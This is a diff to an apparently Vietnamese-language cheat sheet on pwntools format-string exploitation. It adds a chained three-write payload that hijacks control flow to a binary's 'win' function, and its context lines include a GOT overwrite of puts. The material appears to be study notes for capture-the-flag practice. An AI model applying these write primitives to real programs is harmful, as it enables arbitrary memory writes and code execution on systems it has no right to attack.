@@ -199,6 +199,16 @@ payload = fmtstr_pos(38, 0, star=14)                          # b"%*14$c%38$hn"
 payload = flat(fmtstr_pos(10, 0xa8, size=1, form="full"),            # written=0, consumed=0
                fmtstr_pos(14, exe.sym.get_shell + 5, written=0xa8))  # in sau 0xa8 ký tự
 
+# consumed: chuỗi 3 tầng — HAI phát FULL liên tiếp; phát full sau đếm %c TIẾP từ consumed:
+payload = flat(
+    fmtstr_pos(10, 0xb0, size=1, form="full"),                      # consumed=0 -> tới arg10
+    fmtstr_pos(12, 0xc8, size=1, form="full", consumed=10, written=0xb0),  # đếm tiếp arg11->12
+    fmtstr_pos(14, exe.sym.win, written=0xc8),                      # short: ghi xuyên ô 14
+)
+#   phát 1: b"%c"*8 + "%168c%hhn"  (ăn arg1..10, in 0xb0 ký tự)
+#   phát 2: b"%24c%hhn"            (consumed=10 -> chỉ 1 %c, %hhn rơi arg12)
+#   quên consumed=10 -> phát 2 thành "%c"*10+"%14c%hhn", đếm lại từ arg1 -> lệch hết.
+
 # fmtstr_payload (khi BIẾT địa chỉ đích): off = ô bắt đầu payload (dò %p):
 payload = fmtstr_payload(6, {exe.got.puts: exe.sym.win})
 
